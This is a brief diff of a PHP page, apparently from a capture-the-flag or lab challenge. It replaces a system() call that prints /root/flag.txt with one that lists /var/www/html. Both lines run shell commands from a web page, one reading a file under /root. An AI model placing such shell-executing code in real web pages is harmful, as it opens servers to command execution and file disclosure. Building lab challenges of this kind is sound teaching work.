@@ -8,7 +8,7 @@
 </form>
 <pre>
 <?php
-        echo system('cat /root/flag.txt');
+        echo system('ls /var/www/html');
     
 ?>
 </pre>
